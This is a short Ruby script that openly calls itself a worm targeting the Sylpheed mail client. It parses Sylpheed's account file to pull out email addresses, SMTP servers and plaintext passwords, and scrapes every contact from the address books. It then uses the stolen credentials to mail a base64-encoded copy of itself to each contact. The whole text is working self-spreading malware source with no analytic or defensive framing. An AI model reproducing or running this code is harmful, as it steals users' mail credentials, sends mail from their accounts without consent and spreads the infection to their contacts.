   #!/usr/bin/env ruby

   require "net/smtp"

   SYLPATH=ENV["HOME"]+"/.sylpheed-2.0/"

   boundary=sprintf("%02X", rand(99999999 - 10000000) + 10000000) + sprintf("%02X", Time.new.to_i) + sprintf("%02X", $$) + sprintf("%02X", Time.new.usec())
   data = [File.new($0).read()].pack("m*");
   text = 'This is a worm. There are many worms out there but this one belongs to Sephiroth.'
   subject = 'Worming Sylpheed With Ruby'
   attach_name = 'sylpheed.rb'

      Account = Struct.new(:mail_address,:smtp_acc,:pwd)
      parse_string = /address=(.+?)\n.*?smtp_server=(.+?)\n.*?password=(\w+)/m
      accounts =File.read("#{SYLPATH}accountrc").scan(parse_string).map { |arr| Account.new(*arr) }

      adrbk_entries=[]
      Dir["#{SYLPATH}addrbook*.xml"].each do |file|
                   File.open(file).each { |line| adrbk_entries<<line.sub(/^.+email="/,'').sub(/" remarks.+$/,'') if line =~ /email=/ }
      end

      adrbk_entries.each do |emailtosendto|
              accounts.each do |acc|
                         break if Net::SMTP.start(acc.smtp_acc, 25, 'localhost.localdomain', acc.mail_address,acc.pwd, :login) do |smtp|
                                                  smtp.open_message_stream(acc.mail_address,emailtosendto.chomp) do |mailfd|
                                                  mailfd.puts "From: #{acc.mail_address}"
                                                  mailfd.puts "To: #{emailtosendto.chomp}"
                                                  mailfd.puts "Subject: #{subject}"
                                                  mailfd.write("MIME-Version:1.0\r\nContent-Type: multipart/mixed; boundary=\"#{boundary}\"\r\n\r\nThis is a multi-part message in MIME format.\r\n\r\n")
                                                  mailfd.write("--#{boundary}\r\nContent-Type: text/plain; charset=\"iso-8859-1\"\r\nContent-Transfer-Encoding: 8bit\r\n\r\n#{text}\r\n\r\n--#{boundary}\r\n")
                                                  mailfd.write("Content-Type: application/octet-stream; name=\"#{attach_name}\"\r\nContent-Transfer-Encoding: base64\r\n")
                                                  mailfd.write("Content-Disposition: attachment; filename=\"#{attach_name}\"\r\n\r\n#{data}\r\n--#{boundary}--\r\n")
                                                end
                                            end
              end
      end
